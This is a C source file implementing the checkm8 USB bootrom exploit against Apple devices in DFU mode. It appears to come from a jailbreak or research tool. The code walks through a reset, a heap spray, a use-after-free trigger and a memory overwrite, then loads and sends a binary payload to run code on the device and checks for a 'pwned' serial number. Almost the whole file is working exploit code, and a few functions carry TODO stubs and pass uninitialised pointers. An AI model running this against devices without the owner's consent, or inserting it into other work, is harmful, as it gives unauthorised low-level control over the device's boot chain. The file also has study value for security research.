#include <exploit/exploit.h>

// ******************************************************
// Function: checkm8Reset()
//
// Purpose: Trigger a DFU mode reset on the device
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the reset was successful, false otherwise
// ******************************************************
bool checkm8Reset(device_t *device)
{
    transfer_ret_t transferRet;
    if (sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == DFU_FILE_SUFFIX_LENGTH
    && DFUSetStateWaitReset(&device->handle) == true
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == EP0_MAX_PACKET_SIZE)
    {
        return true;
    }
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return false;
}

// ******************************************************
// Function: checkm8Stall()
//
// Purpose: Place the device into a stalled state
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the stall was successful, false otherwise
// ******************************************************
bool checkm8Stall(device_t *device)
{

    unsigned usbAbortTimeout = 10;
    transfer_ret_t transferRet;
    usb_handle_t *handle = &device->handle;
    while (sendUSBControlRequestAsyncNoData(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0xC0, usbAbortTimeout, &transferRet)) {
        if (transferRet.sz < 0xC0
        && sendUSBControlRequestAsyncNoData(handle, 0x80, 6, 0x304, 0xA, 0x40, 1, &transferRet)
        && transferRet.sz == 0) {
            return true;
        }
        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    return false;
}

// ******************************************************
// Function: checkm8Leak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8Leak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC0, transferRet);
}

// ******************************************************
// Function: checkm8NoLeak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8NoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, transferRet);
}

// ******************************************************
// Function: checkm8USBRequestStall()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8USBRequestStall(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x2, DFU_GETSTATUS, 0x0, 0x80, 0x0, transferRet);
}

// ******************************************************
// Function: checkm8USBRequestLeak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8USBRequestLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, transferRet);
}

// ******************************************************
// Function: checkm8USBRequestNoLeak()
//
// Purpose: TODO
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: TODO
// ******************************************************
bool checkm8USBRequestNoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x41, transferRet);
}

// TODO: Handle timeouts correctly for different stages - could use a sendUSBControlRequestWithTimeout() function

// ******************************************************
// Function: checkm8HeapSpray()
//
// Purpose: Spray the heap in order to craft a hole for the IO buffer allocation
//
// Parameters:
//      device_t *device: the device to reset
//
// ******************************************************
bool checkm8HeapSpray(device_t *device)
{
    // Stall the endpoint
    if (!checkm8Stall(device)) { return false; }
    LOG(LOG_DEBUG, "Stalled endpoint");

    // Send non-leaking packets
    for (int i = 1; i <= 6; i++)
    {
        if (!checkm8NoLeak(device)) { return false; }
        LOG(LOG_DEBUG, "Sent regular packet");
    }

    // Leak a ZLP
    if (!checkm8USBRequestLeak(device)) { return false; }
    LOG(LOG_DEBUG, "Sent ZLP-leaking packet");

    // Send non-leaking packet
    if (!checkm8NoLeak(device)) { return false; }
    LOG(LOG_DEBUG, "Sent regular packet");
    
    return true;
}

// Heap spray works

// ******************************************************
// Function: checkm8TriggerUaF()
//
// Purpose: Trigger the use-after-free vulnerability
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the trigger was successful, false otherwise
// ******************************************************
bool checkm8TriggerUaF(device_t *device)
{
    // char *data = malloc(0x800);
    // memset(data, 'A', 0x800);
    // transfer_ret_t transferRet;
    // // Start data phase but leave it incomplete
    // bool ret = sendUSBControlRequestAsync(&device->handle, 0x21, DFU_DNLOAD, 0, 0, data, 0x800, 1, &transferRet);
    // free(data);
    // // Shut down USB stack to trigger the use-after-free
    // ret = sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, &transferRet);
    // return ret;
    unsigned usb_abort_timeout = 10;
	transfer_ret_t transfer_ret;

	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usb_abort_timeout, &transfer_ret)) {
		if(transfer_ret.sz < config_overwrite_pad 
        && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, 0x540 - transfer_ret.sz, &transfer_ret) 
        && transfer_ret.ret == USB_TRANSFER_STALL) {
			sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
			return true;
		}
		if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % 10;
	}
	return false;
}

// size_t checkm8PreparePayload(device_t *device) { 

// }

// ******************************************************
// Function: checkm8Patch()
//
// Purpose: Send the payload to the device and trigger it's execution
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the payload was sent successfully, false otherwise
// ******************************************************
bool checkm8Patch(device_t *device)
{
    FILE *overwriteFile = fopen("src/exploit/payloads/gaster/overwrite.bin", "rb");
    if (overwriteFile == NULL)
    {
        printf("Failed to open overwrite file");
        return false;
    }
    fseek(overwriteFile, 0, SEEK_END);
    size_t overwriteSize = ftell(overwriteFile);
    fseek(overwriteFile, 0, SEEK_SET);
    char *overwriteData = malloc(overwriteSize);
    fread(overwriteData, 1, overwriteSize, overwriteFile);
    fclose(overwriteFile);

    FILE *payloadFile = fopen("src/exploit/payloads/gaster/payload.bin", "rb");
    if (payloadFile == NULL)
    {
        printf("Failed to open payload file");
        return false;
    }
    fseek(payloadFile, 0, SEEK_END);
    size_t payloadSize = ftell(payloadFile);
    fseek(payloadFile, 0, SEEK_SET);
    char *payloadData = malloc(payloadSize);
    fread(payloadData, 1, payloadSize, payloadFile);
    fclose(payloadFile);

    transfer_ret_t transferRet;

    // Stall endpoint
    if (!checkm8USBRequestStall(device))
    {
        LOG(LOG_ERROR, "Failed to stall endpoint");
        return false;
    }

    // Leak a ZLP
    if (!checkm8USBRequestLeak(device))
    {
        LOG(LOG_ERROR, "Failed to leak ZLP");
        return false;
    }

    // Send the overwrite
    if (sendUSBControlRequest(&device->handle, 0, 0, 0, 0, overwriteData, overwriteSize, &transferRet)
    && transferRet.ret == USB_TRANSFER_STALL
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL))
    {
        LOG(LOG_DEBUG, "Sent overwrite");
        bool ret = true;
        size_t packetSize;
        LOG(LOG_DEBUG, "Sending payload of size 0x%2X", payloadSize);

        // Send the payload
        for(int i = 0; ret && i < payloadSize; i += packetSize) {
            packetSize = MIN(payloadSize - i, DFU_MAX_TRANSFER_SIZE);
            ret = sendUSBControlRequest(&device->handle, 0x21, DFU_DNLOAD, 0, 0, &payloadData[i], packetSize, NULL);
        }
        if (ret) {
            LOG(LOG_DEBUG, "Sent payload");
        } else {
            LOG(LOG_ERROR, "Failed to send payload");
            return false;
        }
    } else {
        LOG(LOG_ERROR, "Failed to send overwrite");
        return false;
    }
    free(overwriteData);
    free(payloadData);

    return true;
}

// ******************************************************
// Function: checkm8Done()
//
// Purpose: Check if the device has been successfully exploited
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      bool: true if the device has been successfully exploited, false otherwise
// ******************************************************
int checkm8Done(device_t *device)
{
    return isSerialNumberPwned(getDeviceSerialNumber(&device->handle));
}

// ******************************************************
// Function: checkm8PrepareDevice()
//
// Purpose: Get the device into DFU mode
//
// Parameters:
//      device_t *device: the device to reset
//
// Returns:
//      int: 0 if the device was successfully placed into DFU mode, -1 if there is an error
// ******************************************************
int checkm8PrepareDevice(device_t *device) {
    int ret = findDevice(device, false);
    if (ret == -1)
    {
        return -1;
    }

    if (device->mode == MODE_NORMAL) {
        LOG(LOG_SUCCESS, "Found device in normal mode");
        LOG_NO_NEWLINE(LOG_INFO, "Press enter to place device into recovery mode");
        getchar();
        LOG(LOG_INFO, "Placing device into recovery mode");
        LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
        if (enterRecoveryMode() != 0) {
            LOG(LOG_ERROR, "Failed to place device with udid %s into recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_INFO, "Waiting for device to enter recovery mode");
        if (waitForDeviceInMode(device, MODE_RECOVERY, 20) != 0) {
            LOG(LOG_ERROR, "Device with udid %s failed to enter recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered recovery mode successfully!", device->serialNumber);
    }

    if (device->mode == MODE_RECOVERY) {
        // TODO: DFU helper
        LOG(LOG_INFO, "Please put device into DFU mode manually");
        LOG(LOG_INFO, "Waiting for device to enter DFU mode");
        if (waitForDeviceInMode(device, MODE_DFU, 30) != 0) {
            LOG(LOG_FATAL, "Could not find device in DFU mode after 30 seconds", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered DFU mode successfully!");
    }

    if (isSerialNumberPwned(device->serialNumber))
    {
        LOG(LOG_ERROR, "Device is already in pwned DFU mode, not performing exploit");
        return 1;
    }
    else
    {
        LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
    }
    return 0;
}

char *stageToString(int stage) {
    switch (stage) {
        case STAGE_RESET:
            return "Reset";
        case STAGE_HEAP_SPRAY:
            return "Heap spray";
        case STAGE_TRIGGER:
            return "UaF trigger";
        case STAGE_PATCH:
            return "Patching";
        case STAGE_PWNED:
            return "Pwned";
        default:
            return "Unknown";
    }
}

int checkm8()
{
    device_t device;
    initUSBHandle(&device.handle, 0x5ac, 0x1227);
    if (checkm8PrepareDevice(&device) != 0)
    {
        LOG(LOG_FATAL, "Failed to prepare device");
        return -1;
    }

    bool pwned, ret;

    LOG_NO_NEWLINE(LOG_INFO, "Press enter to exploit device");
    getchar();

    LOG(LOG_DEBUG, "Serial number: %s", getDeviceSerialNumber(&device.handle));

    int stage = STAGE_RESET;
    int stageForLogging = STAGE_RESET;
    char *finalSerial = NULL;
    while (stage != STAGE_PWNED && waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned)) {
        LOG(LOG_DEBUG, "Stage: %s", stageToString(stageForLogging));
        if (!pwned) {
            if (stage == STAGE_RESET) {
                LOG(LOG_INFO, "Resetting device");
                ret = checkm8Reset(&device);
                stage = STAGE_HEAP_SPRAY;
                stageForLogging = STAGE_RESET;
            }
            else if (stage == STAGE_HEAP_SPRAY) {
                LOG(LOG_DEBUG, "Spraying heap");
                ret = checkm8HeapSpray(&device);
                stage = STAGE_TRIGGER;
                stageForLogging = STAGE_HEAP_SPRAY;
            }
            else if (stage == STAGE_TRIGGER) {
                LOG(LOG_DEBUG, "Triggering UaF");
                ret = checkm8TriggerUaF(&device);
                stage = STAGE_PATCH;
                stageForLogging = STAGE_TRIGGER;
            }
            else {
                LOG(LOG_DEBUG, "Patching");
                ret = checkm8Patch(&device);
                stageForLogging = STAGE_PATCH;
                // Try to re-init so serial number is updated
                resetUSBHandle(&device.handle);
                LOG(LOG_DEBUG, "Reset USB handle");
                closeUSBHandle(&device.handle);
                LOG(LOG_DEBUG, "Closed USB handle");
                waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned);
                if (isSerialNumberPwned(getDeviceSerialNumberWithTransfer(&device.handle))) {
                    finalSerial = getDeviceSerialNumberWithTransfer(&device.handle);
                    stage = STAGE_PWNED;
                    pwned = true;
                } else {
                    stage = STAGE_RESET;
                }
            }

            if (ret) {
                LOG(LOG_SUCCESS, "%s completed successfully", stageToString(stageForLogging));
            } else {
                LOG(LOG_FATAL, "%s failed", stageToString(stageForLogging));
                if (stage != STAGE_PATCH) {
                    stage = STAGE_RESET;
                }
            }
            resetUSBHandle(&device.handle);
        }
           
        closeUSBHandle(&device.handle);
    }
    if (pwned) { LOG(LOG_SUCCESS, "Exploit succeeded"); }
    else { LOG(LOG_FATAL, "Exploit failed"); }
    LOG(LOG_INFO, "Serial number: %s", finalSerial);
    return 0;
}
